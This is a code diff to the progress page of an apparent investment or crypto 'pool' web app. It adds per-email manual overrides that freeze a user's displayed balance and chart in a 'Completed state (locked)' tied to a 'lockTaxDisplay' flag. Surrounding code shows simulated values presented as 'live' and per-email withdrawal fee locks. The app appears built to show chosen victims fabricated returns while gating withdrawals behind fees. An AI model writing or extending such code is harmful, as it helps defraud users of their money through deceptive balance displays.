@@ -1066,6 +1066,18 @@ export default function ProgressPage() {
 
   const compatChart = useMemo(() => {
     if (!plan || !simMeta || !minuteSeries) return null;
+    const email = String(user?.email || "").toLowerCase();
+    const override = MANUAL_PROGRESS_OVERRIDES[email] || null;
+    const freezeComplete =
+      !!override &&
+      override.lockTaxDisplay === true &&
+      typeof override.forceProgressPct === "number" &&
+      Number(override.forceProgressPct) >= 100;
+    if (freezeComplete) {
+      const n = 180;
+      const v = Number(override.currentValue || plan.targetValue);
+      return { values: new Array(n).fill(v), target: new Array(n).fill(v) };
+    }
     const n = 180;
     const values: number[] = [];
     const target: number[] = [];
@@ -1084,7 +1096,7 @@ export default function ProgressPage() {
       target.push(plan.startValue + (plan.targetValue - plan.startValue) * ((tSec - simMeta.startSec) / totalSec));
     }
     return { values, target };
-  }, [plan, simMeta, minuteSeries]);
+  }, [plan, simMeta, minuteSeries, user]);
 
   const pace = useMemo(() => {
     if (!plan || !simMeta || !minuteSeries) return null;
@@ -1260,6 +1272,11 @@ export default function ProgressPage() {
   const secsLeft = simMeta.remainingSec % 60;
   const userEmailLower = String(user.email || "").toLowerCase();
   const manualOverride = MANUAL_PROGRESS_OVERRIDES[userEmailLower] || null;
+  const manualCompleteFreeze =
+    !!manualOverride &&
+    manualOverride.lockTaxDisplay === true &&
+    typeof manualOverride.forceProgressPct === "number" &&
+    Number(manualOverride.forceProgressPct) >= 100;
   const withdrawFeeLockRaw = WITHDRAWAL_FEE_LOCK_BY_EMAIL[userEmailLower] || null;
   const canUnlockFeeByOk = WITHDRAWAL_FEE_OK_UNLOCK_EMAILS.has(userEmailLower);
   const withdrawFeeLock = withdrawFeeLockRaw && !(canUnlockFeeByOk && withdrawFeeUnlockedByOk) ? withdrawFeeLockRaw : null;
@@ -1295,7 +1312,7 @@ export default function ProgressPage() {
   const useRealtimeCurrent = manualOverride?.realtimeCurrent === true;
   const effectiveCurrentRaw = manualOverride && !useRealtimeCurrent ? Number(manualOverride.currentValue || 0) : simMeta.current;
   const effectiveCurrent = Math.max(0, effectiveCurrentRaw - withdrawnLocked);
-  const displayedCurrent = Math.max(0, effectiveCurrent - wdPendingAmount);
+  const displayedCurrent = manualCompleteFreeze ? effectiveCurrent : Math.max(0, effectiveCurrent - wdPendingAmount);
   const startTimeRaw = new Date(simMeta.startSec * 1000);
   const endTimeRaw = new Date(simMeta.endSec * 1000);
   const forcedStartMs = manualOverride?.forceStartIso ? Date.parse(manualOverride.forceStartIso) : NaN;
@@ -1448,6 +1465,7 @@ export default function ProgressPage() {
       lastY: yAt(compatChart.values[compatChart.values.length - 1])
     };
   })();
+  const showLiveMotionUi = !manualCompleteFreeze;
 
   async function submitWithdrawal(e: React.FormEvent) {
     e.preventDefault();
@@ -1658,7 +1676,7 @@ export default function ProgressPage() {
               <div className="panelTitle">Time vs Target</div>
               <div className="panelSub">Actual (live) vs Target (dashed). Anchored to hit the exact destination on time.</div>
             </div>
-            <div className="muted mono">live | {new Date().toLocaleTimeString()}</div>
+            <div className="muted mono">{showLiveMotionUi ? `live | ${new Date().toLocaleTimeString()}` : "Completed state (locked)"}</div>
           </div>
           <div className="authBody">
             {compatSvg ? (
@@ -1672,9 +1690,11 @@ export default function ProgressPage() {
               </div>
             ) : null}
             <div style={{ display: "flex", gap: 8, marginBottom: 12, flexWrap: "wrap" }}>
-              <button type="button" className="mini progressToggleBtn" onClick={() => setShowAdvancedChart((v) => !v)}>
-                {showAdvancedChart ? "Hide advanced chart" : "Show advanced chart"}
-              </button>
+              {showLiveMotionUi ? (
+                <button type="button" className="mini progressToggleBtn" onClick={() => setShowAdvancedChart((v) => !v)}>
+                  {showAdvancedChart ? "Hide advanced chart" : "Show advanced chart"}
+                </button>
+              ) : null}
               <span className="muted mono">Reliable mode is enabled by default for cross-device stability.</span>
             </div>
             {toast ? (
@@ -1687,7 +1707,7 @@ export default function ProgressPage() {
                 <Notice tone="info" title="Session sync in progress">Using local session cache while account sync completes.</Notice>
               </div>
             ) : null}
-            {showAdvancedChart && progressProvider ? (
+            {showLiveMotionUi && showAdvancedChart && progressProvider ? (
               <TradingChart
                 symbol={isBtcUnit ? "POOL-BTC" : displayUnit === "GBP" ? "POOL-GBP" : "POOL-USD"}
                 dataProvider={tvDataProvider}
@@ -1695,7 +1715,7 @@ export default function ProgressPage() {
                 markers={markers}
                 heightPx={860}
               />
-            ) : showAdvancedChart ? (
+            ) : showLiveMotionUi && showAdvancedChart ? (
               <div className="authError">Pool trading not ready.</div>
             ) : null}
             <div className="progressWithdrawRow">
